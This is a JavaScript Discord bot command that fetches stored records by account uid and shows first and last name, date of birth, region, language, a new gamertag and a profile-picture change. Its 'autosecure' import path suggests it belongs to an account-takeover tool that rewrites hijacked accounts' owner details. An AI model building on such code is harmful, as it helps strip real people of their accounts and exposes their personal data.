const { queryParams } = require('../../../db/database');
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const countries = require("i18n-iso-countries");
const { languageData } = require('../../../autosecure/utils/process/helpers');

countries.registerLocale(require("i18n-iso-countries/langs/en.json"));

module.exports = {
    name: "newinfo",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            const [_, uid] = interaction.customId.split("|");

            const newinfoData = await fetchNewInfoData(uid, client);
            const newgamertag = await fetchNewGamertag(uid, client);
            const newpfpStatus = await fetchNewPfp(uid, client);

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`newaliases|${uid}`)
                    .setLabel("New Aliases")
                    .setStyle(ButtonStyle.Secondary)
            );

            const embed = new EmbedBuilder()
                .setTitle("Personal Information")
                .setColor('#b2c7e0');

            if (newinfoData) {
                const dobFormatted = formatDOB(newinfoData.dob);
                const region = getCountryName(newinfoData.country);
                const language = getLanguageText(newinfoData.language);

                embed.addFields(
                    {
                        name: "First Name",
                        value: `\`\`\`${newinfoData.firstname || "N/A"}\`\`\``,
                        inline: true
                    },
                    {
                        name: "Last Name",
                        value: `\`\`\`${newinfoData.lastname || "N/A"}\`\`\``,
                        inline: true
                    },
                    {
                        name: "Date of Birth",
                        value: `\`\`\`${dobFormatted}\`\`\``,
                        inline: true
                    },
                    {
                        name: "Region",
                        value: `\`\`\`${region}\`\`\``,
                        inline: true
                    },
                    {
                        name: "Language",
                        value: `\`\`\`${language}\`\`\``
                    }
                );
            }

            if (newpfpStatus) {
                embed.addFields({
                    name: "PFP Changed",
                    value: `\`\`\`${newpfpStatus}\`\`\``,
                    inline: true
                });
            }

            if (newgamertag) {
                const gamertagValue = newgamertag.reason || "N/A";
                embed.addFields({
                    name: "New Gamertag",
                    value: `\`\`\`${gamertagValue}\`\`\``,
                    inline: true
                });
            }

            await interaction.reply({ embeds: [embed], ephemeral: true, components: [row] });

        } catch (error) {
            console.error("Error in newinfo command:", error);
            try {
                await interaction.reply({
                    content: "An error occurred while processing your request.",
                    ephemeral: true
                });
            } catch {}
        }
    }
};

function getCountryName(code) {
    if (!code) return "N/A";
    if (code === "Option is off." || code === "Failed (unknown)") return code;
    const name = countries.getName(code, "en");
    return name || `Unknown (${code})`;
}

function formatDOB(dob) {
    if (!dob) return "N/A";
    const parts = dob.split("|");
    if (parts.length !== 3) return dob;

    const day = parts[0];
    const monthNumber = parseInt(parts[1]);
    const year = parts[2];

    const monthNames = [
        "", "January", "February", "March", "April", "May", "June",
        "July", "August", "September", "October", "November", "December"
    ];

    const month = monthNames[monthNumber] || `Month ${monthNumber}`;
    return `${day} ${month}, ${year}`;
}

function getLanguageText(code) {
    if (!code) return "N/A";
    return languageData[code] || code;
}

async function fetchNewInfoData(uid, client) {
    try {
        const result = await client.queryParams(
            'SELECT newinfo FROM extrainformation WHERE uid = ?',
            [uid]
        );
        return result?.[0]?.newinfo ? JSON.parse(result[0].newinfo) : null;
    } catch (error) {
        console.error("Error fetching newinfo data:", error);
        return null;
    }
}

async function fetchNewGamertag(uid, client) {
    try {
        const result = await client.queryParams(
            'SELECT newgamertag FROM extrainformation WHERE uid = ?',
            [uid]
        );
        return result?.[0]?.newgamertag ? JSON.parse(result[0].newgamertag) : null;
    } catch (error) {
        console.error("Error fetching newgamertag data:", error);
        return null;
    }
}

async function fetchNewPfp(uid, client) {
    try {
        const result = await client.queryParams(
            'SELECT newpfp FROM extrainformation WHERE uid = ?',
            [uid]
        );
        return result?.[0]?.newpfp || null;
    } catch (error) {
        console.error("Error fetching newpfp data:", error);
        return null;
    }
}
